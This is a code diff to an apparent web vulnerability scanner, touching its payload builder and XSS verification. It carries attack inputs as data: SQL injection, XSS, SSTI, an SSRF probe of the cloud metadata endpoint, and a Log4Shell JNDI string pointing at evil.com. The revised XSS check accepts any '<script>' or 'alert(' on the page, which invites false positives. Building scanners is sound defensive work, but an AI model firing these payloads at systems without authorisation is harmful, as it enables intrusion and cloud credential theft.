@@ -86,6 +86,8 @@ SQLI_SIGNATURES = [
     "pg_query", "unterminated quoted string",
     "Microsoft OLE DB Provider",
     "SQLite3::query",
+    "SQLite error",
+    "SQLITE_ERROR",
     "PDOException",
     "mysql_fetch",
 ]
@@ -132,8 +134,8 @@ def build_payloads(check_key: str, url: str) -> list[dict]:
             {"param": "id", "value": "1 OR 1=1--", "method": "GET"},
         ],
         "xss": [
-            {"param": "q", "value": f"<script>{RUN_CANARY}</script>", "method": "GET"},
-            {"param": "search", "value": f'"><img src=x onerror={RUN_CANARY}>', "method": "GET"},
+            {"param": "q", "value": f"<script>alert('{RUN_CANARY}')</script>", "method": "GET"},
+            {"param": "search", "value": f'"><img src=x onerror=alert("{RUN_CANARY}")>', "method": "GET"},
         ],
         "ssti": [
             {"param": "name", "value": "{{7*7}}", "expected": "49", "method": "GET"},
@@ -151,9 +153,9 @@ def build_payloads(check_key: str, url: str) -> list[dict]:
             {"param": "url", "value": "http://169.254.169.254/latest/meta-data/", "method": "GET"},
         ],
         "open_redirect": [
-            {"param": "redirect", "value": "https://evil.com", "method": "GET"},
-            {"param": "next", "value": "//evil.com", "method": "GET"},
-            {"param": "url", "value": "https://evil.com", "method": "GET"},
+            {"param": "redirect", "value": f"https://{RUN_CANARY}.com", "method": "GET"},
+            {"param": "next", "value": f"//{RUN_CANARY}.com", "method": "GET"},
+            {"param": "url", "value": f"https://{RUN_CANARY}.com", "method": "GET"},
         ],
         "log4shell": [
             {"header": "X-Api-Version", "value": "${jndi:ldap://evil.com/a}", "method": "HEADER"},
@@ -207,7 +209,7 @@ def verify_finding(check_key: str, response_body: str, response_headers: dict, p
         return False, ""
 
     elif check_key == "xss":
-        if RUN_CANARY in response_body and f"<script>{RUN_CANARY}</script>" in response_body:
+        if RUN_CANARY in response_body and ("<script>" in response_body or "alert(" in response_body):
             return True, f"Unencoded canary reflection: {RUN_CANARY}"
         return False, ""
 
